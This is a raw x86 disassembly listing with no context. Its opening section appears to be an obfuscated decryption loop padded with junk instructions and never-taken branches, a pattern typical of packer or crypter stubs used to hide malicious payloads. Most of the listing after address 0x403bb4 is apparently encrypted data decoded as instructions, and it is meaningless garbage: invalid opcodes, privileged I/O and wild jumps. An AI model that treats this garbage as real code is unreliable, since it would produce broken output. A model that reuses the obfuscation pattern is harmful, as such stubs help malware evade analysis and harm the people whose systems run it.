  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0x12c4e32d,al
  403bc1:	mov    esp,0x9cf4e4a8
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bcd:	xchg   esp,eax
  403bce:	mov    ah,BYTE PTR [ebp-0x5]
  403bd1:	scas   eax,DWORD PTR es:[edi]
  403bd2:	or     esp,ebx
  403bd4:	in     al,dx
  403bd5:	into   
  403bd6:	fs dec edi
  403bd8:	aam    0xc0
  403bda:	push   esi
  403bdb:	and    eax,0x3b9db2d5
  403be0:	fisttp QWORD PTR [edx+0x5]
  403be3:	mov    ds:0x17eda005,eax
  403be8:	sub    bh,BYTE PTR [ebx+0x73]
  403beb:	cmp    esi,DWORD PTR [ecx]
  403bed:	stos   DWORD PTR es:[edi],eax
  403bee:	add    edx,DWORD PTR ds:0x69df79d9
  403bf4:	or     bl,0xff
  403bf7:	and    DWORD PTR [eax+0x16ac2d0],edi
  403bfd:	pop    eax
  403bfe:	xor    edx,DWORD PTR [ebp-0x17]
  403c01:	imul   ecx,DWORD PTR [eax+0x7f1f4468],0xf8c79f3a
  403c0b:	cs sub eax,edi
  403c0e:	les    edi,FWORD PTR [edx+0xe312f77]
  403c14:	ficomp WORD PTR [esi-0x6e6670d5]
  403c1a:	adc    eax,0xe0cd05fc
  403c1f:	sub    DWORD PTR [esi+0x5c15fea2],ecx
  403c25:	push   esi
  403c26:	push   es
  403c27:	gs push cs
  403c29:	in     eax,dx
  403c2a:	fdivr  QWORD PTR [esi]
  403c2c:	stc    
  403c2d:	cmc    
  403c2e:	mov    esp,esi
  403c30:	lock ins DWORD PTR es:[edi],dx
  403c32:	dec    eax
  403c33:	in     al,0x2f
  403c35:	adc    BYTE PTR [edx-0x793fb518],bh
  403c3b:	cmc    
  403c3c:	fs test al,0x26
  403c3f:	loopne 0x403c0f
  403c41:	ret    0xd7d5
  403c44:	ins    DWORD PTR es:[edi],dx
  403c45:	jne    0x403c62
  403c47:	sbb    al,BYTE PTR [ebx+0x4b37690f]
  403c4d:	sub    eax,DWORD PTR [edx+ebp*4]
  403c50:	and    bl,BYTE PTR [edx]
  403c52:	mov    ebp,esi
  403c54:	cmc    
  403c55:	sar    BYTE PTR [eax],0x2d
  403c58:	and    cl,dh
  403c5a:	retf   0xff59
  403c5d:	lea    edi,ss:[eax+0xd]
  403c61:	sbb    al,0x5b
  403c63:	mov    esp,0x2ebe978a
  403c68:	add    eax,0x28fbf450
  403c6d:	jne    0x403c93
  403c6f:	ins    BYTE PTR es:[edi],dx
  403c70:	sub    eax,0xedf6ef7e
  403c75:	xchg   ecx,eax
  403c76:	rcr    BYTE PTR [ebx+0x66509321],1
  403c7c:	or     DWORD PTR [eax-0x419337f2],esi
  403c82:	in     eax,dx
  403c83:	fbld   TBYTE PTR [edx+0x22]
  403c86:	in     eax,0x36
  403c88:	test   DWORD PTR [ecx+0x77a6045c],edi
  403c8e:	pop    edx
  403c8f:	int    0x2e
  403c91:	mov    ebx,0x63aa3b35
  403c96:	cmp    eax,0x6609e5c2
  403c9b:	and    DWORD PTR [edx],ebp
  403c9d:	cwde   
  403c9e:	inc    ebp
  403c9f:	lea    edi,[ebx+0xb]
  403ca2:	aad    0x1b
  403ca4:	push   0x99599e50
  403ca9:	inc    ebx
  403caa:	cmp    ebp,ecx
  403cac:	dec    ebp
  403cad:	dec    esi
  403cae:	out    dx,eax
  403caf:	xor    BYTE PTR [esi],cl
  403cb1:	jp     0x403c6d
  403cb3:	out    0x82,eax
  403cb5:	jl     0x403c8d
  403cb7:	pushf  
  403cb8:	dec    edi
  403cb9:	sub    ch,BYTE PTR [esi]
  403cbb:	xchg   BYTE PTR [ebp+0x11],dl
  403cbe:	out    dx,al
  403cbf:	or     eax,0x99e83060
  403cc4:	mov    bh,0xc9
  403cc6:	cmp    edi,DWORD PTR [ecx+0x59]
  403cc9:	adc    cl,BYTE PTR [ecx]
  403ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ccc:	mov    edx,0x628a3105
  403cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cd2:	iret   
  403cd3:	mov    ds:0xf86c785c,al
  403cd8:	scas   al,BYTE PTR es:[edi]
  403cd9:	xchg   ebx,eax
  403cda:	es ret 
  403cdc:	adc    al,0xd3
  403cde:	lahf   
  403cdf:	push   ebp
  403ce0:	into   
  403ce1:	cmc    
  403ce2:	into   
  403ce3:	int    0x77
  403ce5:	ja     0x403c72
  403ce7:	sub    DWORD PTR [edx+0x5c0aa34a],edx
  403ced:	dec    ecx
  403cee:	repnz outs dx,DWORD PTR ds:[esi]
  403cf0:	add    al,0x2a
  403cf2:	sbb    BYTE PTR [edi],dh
  403cf4:	dec    ecx
  403cf5:	xchg   edx,eax
  403cf6:	mov    dh,al
  403cf8:	and    BYTE PTR [esp+ecx*4-0x50246d30],dh
  403cff:	cmp    eax,0x362fa546
  403d04:	loop   0x403d2e
  403d06:	cmc    
  403d07:	pop    ecx
  403d08:	jbe    0x403d0d
  403d0a:	mov    edx,0x5e891fbe
  403d0f:	pmullw mm1,QWORD PTR [ecx]
  403d12:	mov    edx,0x82f9c297
  403d17:	cli    
  403d18:	iret   
  403d19:	call   eax
  403d1b:	add    DWORD PTR [edx+eiz*4+0x5b],esi
  403d1f:	test   eax,0x8e1a7858
  403d24:	in     al,dx
  403d25:	push   ds
  403d26:	mov    edi,0xc8788c19
  403d2b:	fcomp  DWORD PTR [edi]
  403d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d2e:	sti    
  403d2f:	sbb    BYTE PTR [eax+0x62],cl
  403d32:	sub    dh,BYTE PTR [edx+ebx*2+0x4]
  403d36:	aas    
  403d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d38:	fdiv   QWORD PTR [eax]
  403d3a:	and    BYTE PTR gs:[ebx-0x44de3523],0xe0
  403d42:	rcl    DWORD PTR [eax],cl
  403d44:	or     ebp,DWORD PTR [edx-0x43]
  403d47:	add    ah,BYTE PTR [edi]
  403d49:	mov    eax,ds:0xf3ebbd1c
  403d4e:	arpl   WORD PTR [eax+0x6d5c829a],di
  403d54:	test   ebx,edi
  403d56:	mov    esi,0x8fdd54cd
  403d5b:	loope  0x403d2d
  403d5d:	loopne 0x403d54
  403d5f:	fdivr  st(6),st
  403d61:	inc    edx
  403d62:	in     al,0x62
  403d64:	xchg   BYTE PTR [edx],ch
  403d66:	fcom   QWORD PTR ds:0xf9ce3d78
  403d6c:	(bad)  
  403d6d:	cmp    ah,BYTE PTR [edi+0x34313ad6]
  403d73:	(bad)  
  403d74:	xchg   edi,eax
  403d75:	sbb    eax,0x2d8e8c3a
  403d7a:	jp     0x403d1a
  403d7c:	lods   al,BYTE PTR ds:[esi]
  403d7d:	test   DWORD PTR [ebx-0x3],ecx
  403d80:	jmp    0x56a4:0xe6ba6d8f
  403d87:	iret   
  403d88:	pop    es
  403d89:	sbb    bl,cl
  403d8b:	fild   QWORD PTR [edx-0x9]
  403d8e:	mov    dh,0x99
  403d90:	addr16 mov ds:0xb1a3,al
  403d94:	dec    ebx
  403d95:	int    0xae
  403d97:	pop    edi
  403d98:	adc    BYTE PTR [ebp-0x70],ah
  403d9b:	stc    
  403d9c:	jg     0x403d82
  403d9e:	iret   
  403d9f:	push   ecx
  403da0:	hlt    
  403da1:	mov    esi,0xabdeb57d
  403da6:	test   al,0x33
  403da8:	and    DWORD PTR [edx],esi
  403daa:	push   eax
  403dab:	frstor [ebp+esi*8-0x6bde8754]
  403db2:	sub    bl,BYTE PTR [edx+0x41be9ad4]
  403db8:	mov    bh,0xb
  403dba:	add    esi,edx
  403dbc:	sbb    al,0x1a
  403dbe:	mov    BYTE PTR [edi+0x3fbd1a32],bh
  403dc4:	aam    0xe1
  403dc6:	ss std 
  403dc8:	icebp  
  403dc9:	xchg   ebx,eax
  403dca:	loopne 0x403d7a
  403dcc:	popa   
  403dcd:	leave  
  403dce:	ss js  0x403e27
  403dd1:	xlat   BYTE PTR ds:[bx]
  403dd3:	push   ebx
  403dd4:	jae    0x403e47
  403dd6:	inc    eax
  403dd7:	mov    esp,0xb3993468
  403ddc:	shl    DWORD PTR [eax],cl
  403dde:	mov    ch,bl
  403de0:	adc    edi,0xffffffa0
  403de3:	(bad)  [edx]
  403de5:	imul   esp,esi,0x23
  403de8:	xchg   edx,eax
  403de9:	xchg   edx,eax
  403dea:	cmp    edi,0x86618290
  403df0:	cmc    
  403df1:	xchg   eax,ecx
  403df3:	xchg   ebx,eax
  403df4:	sti    
  403df5:	dec    edx
  403df6:	in     al,0x40
  403df8:	enter  0x752c,0x1
  403dfc:	adc    al,0xf8
  403dfe:	aam    0x65
  403e00:	pop    ebx
  403e01:	add    al,dl
  403e03:	dec    ebx
  403e04:	stos   DWORD PTR es:[edi],eax
  403e05:	loopne 0x403df3
  403e07:	vunpckhps ymm3,ymm6,ymm6
  403e0b:	call   0x2bf3bee3
  403e10:	push   ss
  403e11:	inc    eax
  403e12:	mov    BYTE PTR ds:0x596629e4,dl
  403e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e19:	mov    edi,esp
  403e1b:	jns    0x403dfc
  403e1d:	in     al,0x68
  403e1f:	xor    DWORD PTR [ebp+0x26],eax
  403e22:	js     0x403de7
  403e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e25:	jle    0x403e84
  403e27:	addr16 (bad) 
  403e29:	ins    BYTE PTR es:[edi],dx
  403e2a:	cld    
  403e2b:	stos   BYTE PTR es:[edi],al
  403e2c:	outs   dx,DWORD PTR ds:[esi]
  403e2d:	and    esi,DWORD PTR [eax+0x52a7851b]
  403e33:	shl    BYTE PTR ds:0x648b707b,cl
  403e39:	jmp    0x403e36
  403e3b:	fild   WORD PTR [ecx+0x61]
  403e3e:	jno    0x403e81
  403e40:	stos   DWORD PTR es:[edi],eax
  403e41:	inc    edi
  403e42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e43:	idiv   BYTE PTR [ebp-0x3d8a7f34]
  403e49:	aad    0x6a
  403e4b:	sub    edi,DWORD PTR [ebp+0x47]
  403e4e:	jbe    0x403e58
  403e50:	sbb    eax,0xfea996a6
  403e55:	(bad)  
  403e56:	lock inc eax
  403e58:	clc    
  403e59:	ror    DWORD PTR [ebp+0x22],cl
  403e5c:	add    eax,0x47e9e7e5
  403e61:	mov    al,ds:0xf7b5c754
  403e66:	pop    ecx
  403e67:	retf   0xa4bf
  403e6a:	popf   
  403e6b:	imul   DWORD PTR [ebp-0x5]
  403e6e:	mov    DWORD PTR [edi+edx*2+0x6f],edi
  403e72:	adc    eax,DWORD PTR [ebx+0x611f6a8a]
  403e78:	inc    ebx
  403e79:	rol    BYTE PTR [eax+0x4fe98b0f],cl
  403e7f:	adc    BYTE PTR [ebp+ebx*4+0x5f2a2dbc],0xa6
  403e87:	sub    esp,DWORD PTR [edx+0x4d50a047]
  403e8d:	jecxz  0x403e24
  403e8f:	scas   al,BYTE PTR es:[edi]
  403e90:	pop    ebx
  403e91:	sbb    DWORD PTR [edi+0x5f],0x1fd3033e
  403e98:	fnstenv [ecx+0x7c]
  403e9b:	or     eax,0xa8f05a1a
  403ea0:	mov    ebp,DWORD PTR [ebx+0x705c3041]
  403ea6:	jmp    0xa4b37777
  403eab:	scas   al,BYTE PTR es:[edi]
  403eac:	je     0x403f08
  403eae:	pop    ebx
  403eaf:	push   edi
  403eb0:	cmc    
  403eb1:	into   
  403eb2:	bswap  eax
  403eb4:	adc    edi,0x8d80eb81
  403eba:	adc    esp,DWORD PTR [eax-0x422d19fe]
  403ec0:	leave  
  403ec1:	inc    esi
  403ec2:	or     dl,dh
  403ec4:	xchg   edx,eax
  403ec5:	adc    DWORD PTR [eax+0x76],edi
  403ec8:	call   0x7ee0acc0
  403ecd:	or     BYTE PTR [ebp-0x7b],bh
  403ed0:	mov    BYTE PTR gs:[esi+eax*4],dl
  403ed4:	call   0x142a:0x994f350e
  403edb:	or     al,0xa7
  403edd:	mov    ebx,0xe3707eb3
  403ee2:	jg     0x403f00
  403ee4:	mov    ecx,0xf95af4be
  403ee9:	mov    dh,0x16
  403eeb:	mov    BYTE PTR [edi-0x4d9d219b],cl
  403ef1:	repz inc ebp
  403ef3:	or     DWORD PTR [ecx+0x75],0x335d8597
  403efa:	fbstp  TBYTE PTR [edx+0x464dd30b]
  403f00:	dec    esi
  403f01:	dec    ebp
  403f02:	push   ecx
  403f03:	inc    ebx
  403f04:	stc    
  403f05:	out    0xa1,al
  403f07:	cmc    
  403f08:	jmp    0x8181c88e
  403f0d:	into   
  403f0e:	call   0x9698:0x9b631c27
  403f15:	pop    esi
  403f16:	stos   BYTE PTR es:[edi],al
  403f17:	fs push esp
  403f19:	test   DWORD PTR [edx-0x2c],0xaad56890
  403f20:	push   ds
  403f21:	jg     0x403f88
  403f23:	mov    ebp,0xf97d02a7
  403f28:	retf   0x558f
  403f2b:	mov    ds:0x6f5a0003,eax
  403f30:	cmp    al,0x75
  403f32:	mov    ebp,0x3dea434d
  403f37:	pop    edx
  403f38:	mov    al,ds:0x95ccb9c0
  403f3d:	adc    al,0xf8
  403f3f:	std    
  403f40:	(bad)  
  403f41:	rcr    edx,cl
  403f43:	dec    edx
  403f44:	pop    ebp
  403f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f46:	xor    ebp,DWORD PTR [edx+eiz*8-0x5d70d54b]
  403f4d:	sti    
  403f4e:	xchg   DWORD PTR [edx+0x7ce6b078],ebx
  403f54:	mov    ?,WORD PTR [ebx+0x1]
  403f57:	or     ebp,DWORD PTR [ecx+0xc]
  403f5a:	es fwait
  403f5c:	and    esi,edx
  403f5e:	ins    DWORD PTR es:[edi],dx
  403f5f:	lock in eax,dx
  403f61:	clc    
  403f62:	test   eax,0xac4f316
  403f67:	aas    
  403f68:	rcr    BYTE PTR [ebx+0x36],0x61
  403f6c:	shl    dl,0xbe
  403f6f:	add    DWORD PTR [esp+edi*4+0x4105c247],ebp
  403f76:	sub    eax,0xbef6bc28
  403f7b:	ja     0x403f3f
  403f7d:	mov    DWORD PTR [edx+0x26],esi
  403f80:	iret   
  403f81:	mov    edi,0xe7ea00c9
  403f86:	jne    0x403f91
  403f88:	ficom  DWORD PTR [esi+0x5b]
  403f8b:	pushf  
  403f8c:	fcmovnu st,st(6)
  403f8e:	pop    ds
  403f8f:	stos   DWORD PTR es:[edi],eax
  403f90:	and    eax,0x6f4ed80
  403f95:	xor    BYTE PTR [edi-0x50f01440],dh
  403f9b:	rol    ah,cl
  403f9d:	adc    eax,0xe3bf1b25
  403fa2:	call   0x16b32905
  403fa7:	nop
  403fa8:	and    DWORD PTR [ecx+0x2a],0xfffffffb
  403fac:	out    dx,eax
  403fad:	sub    eax,0x81706e14
  403fb2:	ret    
  403fb3:	add    ch,cl
  403fb5:	pop    ss
  403fb6:	cmp    ecx,DWORD PTR [eax-0x25d4ba1e]
  403fbc:	shr    BYTE PTR [ebp-0x22],cl
  403fbf:	push   0xd3b87e44
  403fc4:	fiadd  WORD PTR [eax]
  403fc6:	mov    bl,0x8b
  403fc8:	xchg   DWORD PTR [edx+0x13],eax
  403fcb:	jp     0x403f9b
  403fcd:	mov    ebx,0xa10bdd8e
  403fd2:	popa   
  403fd3:	rcr    DWORD PTR [ebp+0x411e41cd],cl
  403fd9:	inc    ebp
  403fda:	mov    eax,0x36f97d7c
  403fdf:	mov    WORD PTR [edi],ds
  403fe1:	add    ah,BYTE PTR [esi]
  403fe3:	pop    eax
  403fe4:	xor    eax,eax
  403fe6:	add    eax,DWORD PTR [ebx+esi*2-0x18fd3a8b]
  403fed:	loop   0x40400b
  403fef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ff0:	push   ecx
  403ff1:	lock xor al,bl
  403ff4:	inc    edi
  403ff5:	lods   eax,DWORD PTR ds:[esi]
  403ff6:	xchg   ecx,eax
  403ff7:	mov    DWORD PTR [ebp-0x4ffd13b1],ebx
  403ffd:	pop    ecx
  403ffe:	aaa    
  403fff:	cmp    cl,BYTE PTR [esi-0x54]
  404002:	loope  0x404047
  404004:	out    0x68,eax
  404006:	mov    ecx,0x6002608e
  40400b:	xor    dl,al
  40400d:	ss pop edx
  40400f:	xor    al,0x93
  404011:	xchg   BYTE PTR [edx+ebp*4-0xc],dh
  404015:	push   cs
  404016:	pop    edx
  404017:	add    al,BYTE PTR [ecx+0x74]
  40401a:	inc    eax
  40401b:	jle    0x403f9d
  40401d:	pop    edi
  40401e:	adc    dl,BYTE PTR [ebx+esi*4-0x70e2045d]
  404025:	dec    esp
  404026:	test   eax,0x339adc41
  40402b:	adc    eax,0x3ed8452b
  404030:	cwde   
  404031:	pop    edx
  404032:	xchg   edi,eax
  404033:	and    al,BYTE PTR [ebp+eax*4-0x56]
  404037:	daa    
  404038:	ret    
  404039:	jecxz  0x404053
  40403b:	sub    dh,BYTE PTR [edi-0x9]
  40403e:	mov    bh,0xac
  404040:	inc    edi
  404041:	jp     0x404080
  404043:	pop    ecx
  404044:	adc    cl,BYTE PTR [edi-0x71]
  404047:	or     al,0x4b
  404049:	mov    eax,0xe9598d87
  40404e:	xchg   BYTE PTR [ecx],dh
  404050:	mov    ?,edi
  404052:	leave  
  404053:	js     0x404067
  404055:	jae    0x404004
  404057:	gs out dx,eax
  404059:	and    al,0x85
  40405b:	cdq    
  40405c:	mov    cl,0x93
  40405e:	outs   dx,BYTE PTR ds:[esi]
  40405f:	arpl   WORD PTR [eax-0x6782673],bp
  404065:	scas   eax,DWORD PTR es:[edi]
  404066:	fs xchg esi,eax
  404068:	sub    al,0x22
  40406a:	adc    eax,ecx
  40406c:	xchg   DWORD PTR [eax+0x5e],ebp
  40406f:	inc    edi
  404070:	dec    eax
  404071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404072:	nop
  404073:	arpl   WORD PTR [ebp-0x49],bp
  404076:	inc    ebx
  404077:	into   
  404078:	adc    bl,BYTE PTR [edx]
  40407a:	fistp  QWORD PTR ds:0xd11ed6da
  404080:	repz out dx,eax
  404082:	xchg   DWORD PTR [edx+0x4782877],esp
  404088:	retf   0xa17c
  40408b:	pop    ss
  40408c:	pop    esp
  40408d:	fwait
  40408e:	mul    DWORD PTR [edi]
  404090:	pop    edi
  404091:	wrmsr  
  404093:	retf   
  404094:	adc    al,0xf2
  404096:	adc    al,0x92
  404098:	imul   edx,DWORD PTR [edx-0x46e98ab],0x9d4a20cf
  4040a2:	add    dh,ah
  4040a4:	imul   ecx,DWORD PTR [ebx+0x309da0d9],0x274faf2d
  4040ae:	mov    esp,0x1016a5f2
  4040b3:	cmp    eax,DWORD PTR [edi+ebp*8]
  4040b6:	adc    al,BYTE PTR [eax]
  4040b8:	dec    edx
  4040b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040ba:	xchg   ebx,eax
  4040bb:	scas   eax,DWORD PTR es:[edi]
  4040bc:	and    BYTE PTR [ecx-0x55],0x66
  4040c0:	iret   
  4040c1:	pop    eax
  4040c2:	mov    edx,cs
  4040c4:	mov    bh,0x63
  4040c6:	inc    ebp
  4040c7:	loop   0x4040fe
  4040c9:	mov    al,0x15
  4040cb:	xchg   ebx,eax
  4040cc:	mov    ds,WORD PTR [edi]
  4040ce:	dec    esp
  4040cf:	or     ch,cl
  4040d1:	pop    ss
  4040d2:	sar    BYTE PTR [ecx-0x1],cl
  4040d5:	dec    edi
  4040d6:	pop    eax
  4040d7:	arpl   WORD PTR [edx-0x5c],bx
  4040da:	and    BYTE PTR [edi-0xf2b2438],dl
  4040e0:	dec    ebx
  4040e1:	dec    esp
  4040e2:	out    0xe6,eax
  4040e4:	sahf   
  4040e5:	rcr    DWORD PTR [edi-0x37],1
  4040e8:	inc    ebx
  4040e9:	mov    ebp,0x33271a82
  4040ee:	push   esp
  4040ef:	inc    ebx
  4040f0:	js     0x4040d3
  4040f2:	jae    0x404138
  4040f4:	xchg   esp,eax
  4040f5:	test   BYTE PTR [edx],dl
  4040f7:	sub    al,0xe2
  4040f9:	pop    ds
  4040fa:	test   eax,0x7856be67
  4040ff:	push   ebp
  404100:	inc    edi
  404101:	(bad)  
  404103:	sub    eax,0xdb3282e7
  404108:	dec    edx
  404109:	sub    al,BYTE PTR [ebx-0x30]
  40410c:	add    BYTE PTR [ebp-0x79],dh
  40410f:	fdivrp st(0),st
  404111:	aas    
  404112:	shr    DWORD PTR [edx+0x6f],0xe8
  404116:	aam    0x84
  404118:	jle    0x404182
  40411a:	cwde   
  40411b:	xchg   esi,eax
  40411c:	dec    ebx
  40411d:	shl    DWORD PTR [ebx-0xecb7818],0xf6
  404124:	cmp    ecx,ebp
  404126:	loop   0x4040b2
  404128:	or     al,0x8
  40412a:	and    al,0xa8
  40412c:	dec    edx
  40412d:	jmp    0xad08:0xe781e786
  404134:	gs xchg ebx,eax
  404136:	and    ebx,eax
  404138:	xor    al,0x38
  40413a:	push   edi
  40413b:	loop   0x404149
  40413d:	f2xm1  
  40413f:	aad    0x77
  404141:	outs   dx,BYTE PTR ds:[esi]
  404142:	mov    edx,0x80e6243f
  404147:	sbb    edx,DWORD PTR [edi]
  404149:	fcomp  st(3)
  40414b:	ffree  st(5)
  40414d:	inc    eax
  40414e:	push   cs
  40414f:	push   ecx
  404150:	das    
  404151:	jle    0x4041c6
  404153:	loopne 0x4041ab
  404155:	sti    
  404156:	lds    ebx,FWORD PTR [edi-0x1faf8171]
  40415c:	ss out 0x9f,al
  40415f:	test   eax,0x69ebb8ec
  404164:	mov    dh,0x5a
  404166:	rcr    BYTE PTR [edx-0x606cad78],cl
  40416c:	jns    0x4041dc
  40416e:	je     0x40416c
  404170:	into   
  404171:	mov    ds:0x70b64e2c,eax
  404176:	iret   
  404177:	jecxz  0x4041d8
  404179:	lods   eax,DWORD PTR ds:[esi]
  40417a:	sub    dl,ch
  40417c:	pop    eax
  40417d:	test   BYTE PTR [edi-0x43d562c7],ah
  404183:	and    eax,0x57a55b7c
  404188:	jne    0x4041f8
  40418a:	mov    esi,0xa67bd012
  40418f:	ret    
  404190:	pushf  
  404191:	loop   0x4041c1
  404193:	cmp    ah,BYTE PTR [edx+0x66]
  404196:	push   eax
  404197:	sar    BYTE PTR [esi],0xe5
  40419a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40419b:	add    BYTE PTR [edi-0x12ffb56a],ah
  4041a1:	int3   
  4041a2:	jmp    0x4041a2
  4041a4:	popf   
  4041a5:	jo     0x4041d3
  4041a7:	adc    dh,BYTE PTR [ecx+ebp*8+0x6b1973aa]
  4041ae:	pop    esp
  4041af:	fadd   QWORD PTR [edi]
  4041b1:	cmp    ebp,edx
  4041b3:	add    al,0x24
  4041b5:	not    BYTE PTR [ecx]
  4041b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041b8:	fadd   st(0),st
  4041ba:	rcr    DWORD PTR [esi-0x5],cl
  4041bd:	jb     0x404173
  4041bf:	je     0x40421a
  4041c1:	fsubr  QWORD PTR [eax]
  4041c3:	mov    ebx,edi
  4041c5:	mov    bl,0xd1
  4041c7:	test   ah,0xbb
  4041ca:	out    0x30,al
  4041cc:	call   0x1a24e898
  4041d1:	and    esi,esi
  4041d3:	repnz push 0x677e981c
  4041d9:	add    ecx,DWORD PTR [eax+edx*2-0x14029684]
  4041e0:	push   edi
  4041e1:	out    0x24,eax
  4041e3:	jo     0x404245
